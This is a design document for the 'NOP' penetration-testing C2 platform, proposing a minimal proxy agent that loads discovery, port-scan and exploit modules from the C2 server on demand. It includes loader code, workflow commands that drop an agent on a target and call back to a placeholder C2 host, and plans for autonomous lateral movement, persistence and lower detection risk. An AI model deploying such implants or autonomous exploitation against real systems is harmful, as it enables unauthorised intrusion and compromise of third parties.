# Thin-First Hybrid Architecture - Minimal Agent with Selective Loading

**Date:** 2026-01-03  
**Status:** Design Refinement  
**Proposed By:** @goranjovic55  
**Related:** agent-types-and-build-config.md

## Executive Summary

This document explores a **"Thin-First Hybrid"** architecture that defaults to the minimal thin proxy agent and only loads modules when offline functionality is specifically required. This approach recognizes that most agent operations are operator-driven and real-time, making a minimal baseline optimal for the majority of use cases.

## Problem Statement

The current Hybrid architecture recommendation includes basic modules (discovery, heartbeat) built into the agent by default (~10-15MB). However, analysis of typical agent usage patterns reveals:

1. **Most operations are operator-driven** - Active scanning, traffic capture, access testing happen when operator is present
2. **C2 connectivity is usually available** - Operators work in real-time with C2 connection
3. **Proxying is sufficient for most tasks** - C2 can run tools through agent's network perspective
4. **Offline functionality is the exception** - Scheduled scanning, autonomous exploitation are rare use cases
5. **Smaller is better** - Minimal footprint reduces detection, speeds deployment

## Proposed Architecture: Thin-First Hybrid

### Concept

Start with the **absolute minimum** (thin proxy ~5-15MB) and add modules **only when offline operation is required**.

```
Default Agent (5-15MB)          If Offline Needed (+modules)
┌─────────────────────┐         ┌─────────────────────────────┐
│ Thin Proxy Agent    │   →     │ Thin + Selective Modules    │
├─────────────────────┤         ├─────────────────────────────┤
│ Core (minimal)      │         │ Core (same)                 │
│ ├─ Registration     │         │ ├─ Registration             │
│ ├─ Heartbeat        │         │ ├─ Heartbeat                │
│ └─ Command Queue    │         │ └─ Command Queue            │
├─────────────────────┤         ├─────────────────────────────┤
│ Proxy               │         │ Proxy (same)                │
│ ├─ SOCKS5 Server    │         │ ├─ SOCKS5 Server            │
│ ├─ HTTP Proxy       │         │ ├─ HTTP Proxy               │
│ └─ Port Forwarding  │         │ └─ Port Forwarding          │
└─────────────────────┘         ├─────────────────────────────┤
                                │ Offline Modules (added)     │
                                │ ├─ Discovery (for schedule) │
                                │ ├─ Port Scan (autonomous)   │
                                │ └─ Exploit Exec (automated) │
                                └─────────────────────────────┘
         5-15MB                          15-35MB
```

### Core Philosophy

**"Everything through proxy by default, modules only for offline automation"**

- **Default behavior**: Thin proxy relay
- **Operator present**: Use C2 tools through proxy (nmap, scapy, SSH via agent)
- **Offline required**: Load specific modules (discovery for scheduled scans, exploit for autonomous operation)

## Usage Patterns Analysis

### Pattern 1: Real-Time Operator-Driven (95% of cases)

**Scenario:** Penetration tester doing active reconnaissance

```
Operator: "Scan 192.168.1.0/24"
├─ C2 runs: nmap --proxies socks5://agent:1080 -p 1-1000 192.168.1.0/24
├─ Traffic flows through agent's network interface
├─ Results displayed in C2 console
└─ No module needed on agent (proxy sufficient)

Operator: "Capture traffic on eth0"
├─ C2 runs: tcpdump via SSH tunnel through agent
├─ OR C2 sends one-time traffic capture command
├─ Packets stream back to C2 for analysis
└─ No persistent module needed (real-time only)

Operator: "Test SSH access to 192.168.1.50"
├─ C2 runs: ssh -o ProxyCommand="nc -X 5 -x agent:1080 %h %p" user@192.168.1.50
├─ Connection proxied through agent
└─ No access test module needed (direct proxy)
```

**Agent Type:** Thin Proxy (5-15MB)  
**Modules:** None  
**Rationale:** Operator is present, C2 connected, tools run on C2

### Pattern 2: Scheduled Autonomous Scanning (4% of cases)

**Scenario:** Agent needs to scan network every 6 hours and report changes

```
Requirement: Autonomous network discovery
├─ Without operator present
├─ C2 may be unreachable
├─ Agent must execute locally
└─ Results queued for later exfiltration

Solution: Load Discovery Module
├─ Agent downloads discovery module (2-5MB)
├─ Module cached on agent
├─ Scheduled task executes discovery
├─ Results stored locally
└─ Sync to C2 when connection available
```

**Agent Type:** Thin + Discovery Module (7-20MB)  
**Modules:** Discovery  
**Rationale:** Offline operation required, specific module needed

### Pattern 3: Autonomous Exploitation (1% of cases)

**Scenario:** Agent autonomously exploits new systems as they appear

```
Requirement: Autonomous lateral movement
├─ Detect new hosts on network
├─ Attempt exploitation without operator
├─ Establish persistence on compromised systems
└─ Report success to C2

Solution: Load Discovery + Exploit Modules
├─ Agent downloads discovery module (2-5MB)
├─ Agent downloads exploit module (5-10MB)
├─ Both modules cached
├─ Agent runs autonomously
└─ Reports results when C2 available
```

**Agent Type:** Thin + Discovery + Exploit (12-35MB)  
**Modules:** Discovery, Exploit  
**Rationale:** Fully autonomous operation, multiple modules needed

## Module Loading Strategy

### Default (Thin Proxy Only)

**Built-in (5-15MB):**
- Core (registration, heartbeat, command queue)
- SOCKS5 proxy server
- HTTP proxy server
- TCP/UDP port forwarding
- WebSocket C2 communication

**NOT Built-in:**
- ❌ Discovery module
- ❌ Port scan module
- ❌ Traffic capture module
- ❌ Access test module
- ❌ Exploit module
- ❌ Packet crafting module

### When to Add Modules

| Module | Add When | Size | Use Case |
|--------|----------|------|----------|
| Discovery | Scheduled network scans needed | +2-5MB | Autonomous recon |
| Port Scan | Scheduled port scanning needed | +3-5MB | Automated scanning |
| Traffic Capture | Continuous monitoring offline | +5-10MB | Persistent PCAP |
| Exploit Exec | Autonomous exploitation needed | +5-10MB | Auto lateral movement |
| Packet Craft | Offline packet generation | +3-5MB | Automated testing |

### Modules That Are NEVER Needed Offline

**Access Testing Modules (SSH, RDP, VNC, FTP):**
- ✅ Always done through proxy in real-time
- ✅ Operator needs interactive access anyway
- ❌ No offline use case
- **Conclusion:** NEVER load these as modules, always proxy

**Traffic Analysis:**
- ✅ Done on C2 where tools exist
- ✅ Wireshark, tcpdump parsing on operator's machine
- ❌ No benefit to analyzing on agent
- **Conclusion:** Stream raw packets, analyze on C2

## Build Configuration Refinement

### Updated Build Options

```typescript
interface ThinFirstBuildConfig {
  // Start with thin proxy (always)
  baseType: 'thin';  // Not selectable, always thin
  
  // Language
  language: 'go' | 'python';
  
  // Target platform
  targetOS: 'linux' | 'windows' | 'macos';
  architecture: 'amd64' | 'arm64' | '386';
  
  // Offline modules (optional, only if needed)
  offlineModules: {
    discovery?: {
      enabled: boolean;
      schedule?: string;  // e.g., "*/6 * * * *" (cron)
    };
    portScan?: {
      enabled: boolean;
      schedule?: string;
      targets?: string[];  // Default targets
    };
    trafficCapture?: {
      enabled: boolean;
      continuous?: boolean;
      interface?: string;
    };
    exploitExec?: {
      enabled: boolean;
      autonomous?: boolean;
      targets?: string[];
    };
    packetCraft?: {
      enabled: boolean;
    };
  };
  
  // NEVER include these (always proxied)
  // - SSH client
  // - RDP client
  // - VNC client
  // - FTP client
  // - HTTP client
  
  // Proxy configuration (always included)
  proxy: {
    socks5Port: number;      // Default: 1080
    httpPort: number;        // Default: 8080
    enableCompression: boolean;
  };
  
  // Standard options
  c2URL: string;
  checkInInterval: number;
  security: SecurityConfig;
  persistence?: PersistenceConfig;
}
```

### Updated UI

```tsx
<AgentBuilder>
  {/* Base is always thin - no selection needed */}
  <InfoBox>
    Base Agent: Thin Proxy (5-15MB)
    Includes: Proxy relay, heartbeat, C2 communication
  </InfoBox>
  
  {/* Optional offline modules */}
  <SectionHeader>Offline Modules (Optional)</SectionHeader>
  <HelpText>
    Only add modules if agent needs to operate without C2 connection.
    Most operations work through proxy without modules.
  </HelpText>
  
  <ModuleSelector>
    <Module name="discovery">
      <Checkbox>Network Discovery</Checkbox>
      <Description>For scheduled network scans (+2-5MB)</Description>
      {selected && <ScheduleInput placeholder="*/6 * * * *" />}
    </Module>
    
    <Module name="portScan">
      <Checkbox>Port Scanning</Checkbox>
      <Description>For autonomous port scans (+3-5MB)</Description>
    </Module>
    
    <Module name="exploitExec">
      <Checkbox>Exploit Execution</Checkbox>
      <Description>For autonomous lateral movement (+5-10MB)</Description>
    </Module>
  </ModuleSelector>
  
  {/* Modules NEVER needed */}
  <SectionHeader>Real-Time Operations (Via Proxy)</SectionHeader>
  <InfoBox color="blue">
    The following always work through proxy - no modules needed:
    • SSH/RDP/VNC/FTP access (proxied in real-time)
    • Traffic capture (stream to C2)
    • Packet crafting (one-time commands)
    • Service enumeration (via proxied nmap)
  </InfoBox>
  
  <EstimatedSize>
    Estimated Size: {calculateSize()} MB
    Base (thin): 5-15MB
    {offlineModules.discovery && '+ Discovery: 2-5MB'}
    {offlineModules.portScan && '+ Port Scan: 3-5MB'}
    {offlineModules.exploitExec && '+ Exploit: 5-10MB'}
  </EstimatedSize>
</AgentBuilder>
```

## Implementation Details

### Thin Proxy Agent (Go) - Default

```go
// cmd/agent/main.go - Minimal default agent

package main

import (
    "agent/internal/core"
    "agent/internal/proxy"
)

func main() {
    // Initialize minimal agent
    agent := core.NewAgent(core.Config{
        AgentType:  "thin",  // Always thin
        C2URL:      os.Getenv("C2_URL"),
        ProxyPorts: core.ProxyPorts{
            SOCKS5: 1080,
            HTTP:   8080,
        },
    })
    
    // Start proxy servers (always included)
    go proxy.StartSOCKS5(":1080", agent.Auth)
    go proxy.StartHTTP(":8080", agent.Auth)
    
    // NO modules loaded by default
    // Modules only loaded on-demand via C2 command
    
    // Start agent
    agent.Run()
}
```

### On-Demand Module Loading

```go
// internal/core/module_loader.go

type ModuleLoader struct {
    agent         *Agent
    loadedModules map[string]Module
    cachePath     string
}

func (ml *ModuleLoader) LoadModule(name string, persistent bool) error {
    // Check if already loaded
    if _, exists := ml.loadedModules[name]; exists {
        return nil
    }
    
    // Check cache first
    cachedPath := filepath.Join(ml.cachePath, name+".so")
    if fileExists(cachedPath) {
        return ml.loadFromCache(cachedPath, name)
    }
    
    // Download from C2
    moduleData, err := ml.downloadFromC2(name)
    if err != nil {
        return err
    }
    
    // Verify signature
    if err := ml.verifySignature(moduleData); err != nil {
        return err
    }
    
    // Save to cache if persistent
    if persistent {
        ioutil.WriteFile(cachedPath, moduleData, 0700)
    }
    
    // Load module
    module, err := plugin.Open(cachedPath)
    if err != nil {
        return err
    }
    
    ml.loadedModules[name] = module
    return nil
}

// Example: Load discovery module for scheduled scanning
func (ml *ModuleLoader) EnableScheduledDiscovery(schedule string) error {
    // Load discovery module
    if err := ml.LoadModule("discovery", true); err != nil {
        return err
    }
    
    // Set up cron job
    c := cron.New()
    c.AddFunc(schedule, func() {
        result := ml.loadedModules["discovery"].Execute(params)
        ml.agent.QueueResult(result)
    })
    c.Start()
    
    return nil
}
```

### C2 Module Management

```python
# backend/app/services/agent_module_service.py

class AgentModuleService:
    """Manage modules on agents"""
    
    async def load_module(self, agent_id: str, module_name: str, 
                         persistent: bool = False, 
                         schedule: Optional[str] = None) -> dict:
        """
        Load a module onto an agent
        
        Args:
            agent_id: Target agent
            module_name: Module to load (discovery, portscan, etc.)
            persistent: Cache module on agent for offline use
            schedule: Optional cron schedule for autonomous execution
        """
        agent = await self.get_agent(agent_id)
        
        # Send load module command
        command = {
            "type": "load_module",
            "module": module_name,
            "persistent": persistent,
            "schedule": schedule,
        }
        
        result = await self.send_command(agent_id, command)
        
        # Update agent's loaded modules list
        if result["status"] == "success":
            agent.loaded_modules.append(module_name)
            await self.update_agent(agent)
        
        return result
    
    async def unload_module(self, agent_id: str, module_name: str):
        """Unload a module from agent to free memory"""
        command = {
            "type": "unload_module",
            "module": module_name,
        }
        return await self.send_command(agent_id, command)
    
    async def list_available_modules(self) -> List[dict]:
        """List modules available for loading"""
        return [
            {
                "name": "discovery",
                "description": "Network discovery (ARP, ICMP)",
                "size": "2-5MB",
                "use_case": "Scheduled network scanning",
            },
            {
                "name": "portscan",
                "description": "Port scanning (TCP, UDP, SYN)",
                "size": "3-5MB",
                "use_case": "Autonomous port scanning",
            },
            {
                "name": "exploit",
                "description": "Exploit execution framework",
                "size": "5-10MB",
                "use_case": "Autonomous lateral movement",
            },
            # Note: SSH/RDP/VNC NOT in list - always proxied
        ]
```

## Comparison: Previous Hybrid vs Thin-First Hybrid

### Previous Hybrid Architecture

```
Default Build:
- Core: 5MB
- Discovery (built-in): 2-5MB
- Heartbeat: included in core
- Total: ~10-15MB

On-Demand:
- Port scan: download when needed
- Traffic capture: download when needed
- Access test: download when needed
```

### New Thin-First Hybrid Architecture

```
Default Build:
- Core: 3MB
- Proxy: 2-5MB
- Total: ~5-10MB

On-Demand (ONLY for offline):
- Discovery: load only if scheduled scans needed
- Port scan: load only if autonomous scanning needed
- Exploit: load only if autonomous exploitation needed

NEVER loaded (always proxied):
- SSH/RDP/VNC/FTP clients
- Traffic analysis tools
- Packet crafting (one-time via commands)
```

### Benefits of Thin-First

| Aspect | Previous Hybrid | Thin-First Hybrid |
|--------|----------------|-------------------|
| **Default Size** | 10-15MB | 5-10MB |
| **Deployment** | Slower | Faster |
| **Detection Risk** | Medium | Lower |
| **Operator Workflow** | Same as thin (proxied) | Same as thin (proxied) |
| **Offline Capability** | Basic discovery built-in | Load on-demand only if needed |
| **Flexibility** | Medium | High |
| **Memory Usage** | ~80MB | ~50MB |
| **Complexity** | Medium | Low (proxy is simple) |

## Workflow Examples

### Example 1: Standard Penetration Test

**Operator workflow with thin-first agent:**

```bash
# 1. Deploy agent (5-10MB, thin proxy only)
scp agent-thin-linux user@target:/tmp/
ssh user@target "/tmp/agent-thin-linux --c2 https://c2.example.com"

# 2. Agent connects, operator sees in UI
# Status: Online, Type: Thin Proxy, Size: 8MB, Modules: None

# 3. Operator selects agent POV in NOP UI
POV Switcher: [Agent: target (192.168.1.50)] ✓

# 4. Operator runs network discovery (via proxy)
# NOP runs: nmap --proxies socks5://agent:1080 192.168.1.0/24
# Results appear in Assets page - agent's network perspective

# 5. Operator scans specific hosts (via proxy)
# NOP runs: nmap -p 1-65535 --proxies socks5://agent:1080 192.168.1.100

# 6. Operator captures traffic (streaming via command)
# NOP sends: capture_traffic interface=eth0 filter="port 80"
# Packets stream to C2, displayed in Traffic page

# 7. Operator tests SSH access (via proxy)
# NOP proxies SSH connection through agent
# Interactive SSH session in browser

# Result: Entire pentest completed with 8MB agent, no modules loaded
```

### Example 2: Long-Term Red Team with Autonomous Scanning

**Operator needs scheduled discovery:**

```bash
# 1. Deploy thin agent (same as above)
scp agent-thin-linux user@target:/tmp/
ssh user@target "/tmp/agent-thin-linux --c2 https://c2.example.com"

# 2. Agent connects
# Status: Online, Type: Thin Proxy, Size: 8MB, Modules: None

# 3. Operator enables scheduled discovery
# In NOP UI: Agent Settings → Enable Offline Module
# Module: Discovery, Schedule: "0 */6 * * *" (every 6 hours)

# 4. C2 sends load_module command
# Agent downloads discovery module (3MB)
# Agent now 11MB, Module: Discovery
# Cron job set up: run discovery every 6 hours

# 5. Operator disconnects, C2 may go offline
# Agent continues autonomous discovery
# Results queued locally

# 6. When C2 reconnects
# Agent syncs queued discovery results
# Operator sees network changes over time

# Result: Autonomous operation with 11MB agent, 1 module loaded
```

### Example 3: Autonomous Lateral Movement

**Operator needs full automation:**

```bash
# 1. Deploy thin agent
scp agent-thin-linux user@target:/tmp/
ssh user@target "/tmp/agent-thin-linux --c2 https://c2.example.com"

# 2. Load required modules for automation
# In NOP UI: Agent Settings → Autonomous Mode
# Modules: Discovery, Exploit Execution

# 3. C2 loads modules
# Agent downloads discovery (3MB) + exploit (8MB)
# Agent now 19MB, Modules: Discovery, Exploit

# 4. Configure autonomous behavior
# - Discover new hosts every hour
# - Attempt exploitation on new hosts
# - Report successes to C2

# 5. Agent operates autonomously
# - Scans network
# - Finds new host 192.168.1.105
# - Attempts exploitation
# - Gains access
# - Establishes persistence
# - Reports to C2

# Result: Fully autonomous with 19MB agent, 2 modules loaded
```

## Decision Matrix: When to Load Modules

### Module: Discovery

**Load if:**
- ✅ Scheduled network scanning required
- ✅ Agent must monitor network changes without operator
- ✅ C2 may be offline during scanning periods

**Don't load if:**
- ❌ Operator performs manual discovery (use proxy + nmap on C2)
- ❌ One-time scan (send command, don't persist module)
- ❌ C2 always available (proxy sufficient)

### Module: Port Scan

**Load if:**
- ✅ Scheduled port scanning required
- ✅ Autonomous vulnerability assessment needed
- ✅ Large-scale scanning without operator supervision

**Don't load if:**
- ❌ Operator runs targeted scans (use proxy + nmap on C2)
- ❌ One-time port scan (command sufficient)
- ❌ Real-time scanning with operator present

### Module: Traffic Capture

**Load if:**
- ✅ Continuous 24/7 packet capture required
- ✅ Large PCAP files stored locally on agent
- ✅ Offline traffic analysis on agent

**Don't load if:**
- ❌ Real-time traffic monitoring (stream to C2)
- ❌ Operator analyzes traffic (capture via command, analyze on C2)
- ❌ Short-duration captures

### Module: Exploit Execution

**Load if:**
- ✅ Autonomous lateral movement required
- ✅ Agent exploits without operator intervention
- ✅ C2 may be offline during exploitation

**Don't load if:**
- ❌ Operator runs exploits manually (via C2 tools)
- ❌ Targeted exploitation with supervision
- ❌ One-time exploit execution

### Modules: SSH/RDP/VNC/FTP Clients

**NEVER load these:**
- ❌ Always proxied in real-time
- ❌ Require interactive operator session anyway
- ❌ No offline use case
- ❌ Increase size unnecessarily

## Recommendations

### Default Agent Build

**Recommendation:** Thin Proxy only (5-10MB)

```yaml
# default-agent-config.yaml
agentType: thin
language: go
offlineModules: []  # None by default
proxy:
  socks5Port: 1080
  httpPort: 8080
  compression: true
```

### When to Customize

**Add Discovery module if:**
- Deployment duration > 1 week
- Network monitoring required
- Scheduled scans needed

**Add Exploit module if:**
- Autonomous operation required
- Red team engagement
- Lateral movement automation needed

**Keep thin-only if:**
- Penetration test < 1 week
- Operator always present
- Real-time operation only

## Updated Architecture Diagram

```
┌─────────────────────────────────────────────────────────┐
│                    NOP C2 Server                        │
│  ┌──────────────────────────────────────────────────┐   │
│  │  Operator Tools (run on C2)                      │   │
│  │  • nmap (via SOCKS proxy to agent)               │   │
│  │  • scapy (via agent tunnel)                      │   │
│  │  • SSH client (proxied through agent)            │   │
│  │  • Traffic analysis (Wireshark on streamed data) │   │
│  └──────────────────┬───────────────────────────────┘   │
│  ┌──────────────────▼───────────────────────────────┐   │
│  │  Agent Controller                                │   │
│  │  • Module Repository                             │   │
│  │  • Module Loader (on-demand)                     │   │
│  │  • Proxy Route Manager                           │   │
│  └──────────────────┬───────────────────────────────┘   │
└────────────────────┬┼───────────────────────────────────┘
                     ││ WebSocket/TLS
                     ││ Proxy Traffic
                     ││
    ┌────────────────▼▼───────────────┐
    │  Agent (Thin-First)              │
    │  ┌────────────────────────────┐  │
    │  │ Core (5-10MB default)      │  │
    │  │ • Registration             │  │
    │  │ • Heartbeat                │  │
    │  │ • Command Queue            │  │
    │  │ • SOCKS5 Proxy ← ALWAYS    │  │
    │  │ • HTTP Proxy   ← ALWAYS    │  │
    │  │ • Port Forward ← ALWAYS    │  │
    │  └────────────────────────────┘  │
    │  ┌────────────────────────────┐  │
    │  │ Optional Offline Modules   │  │
    │  │ (loaded only if needed)    │  │
    │  │ • Discovery (on-demand)    │  │
    │  │ • Port Scan (on-demand)    │  │
    │  │ • Exploit (on-demand)      │  │
    │  └────────────────────────────┘  │
    └──────────────────────────────────┘
```

## Conclusion

The **Thin-First Hybrid** architecture is the optimal default for NOP agents:

1. **Minimal by default** (5-10MB) - Lower detection, faster deployment
2. **Proxy-first philosophy** - Operator-driven operations through C2 tools
3. **Selective module loading** - Add offline capability only when needed
4. **Never include unnecessary modules** - SSH/RDP/VNC always proxied, never embedded

This approach recognizes that **most agent operations are real-time and operator-driven**, making a thin proxy the ideal baseline. Modules are added **only for the minority of cases requiring offline automation**.

### Recommended Default

**For 95% of deployments:** Thin proxy only (5-10MB)  
**For autonomous operations:** Thin + selective modules (10-35MB as needed)  
**For full offline capability:** Load all required modules (up to 50MB if truly needed)

This architecture provides the **smallest possible functional agent** while maintaining the flexibility to scale up capabilities when offline operation is genuinely required.
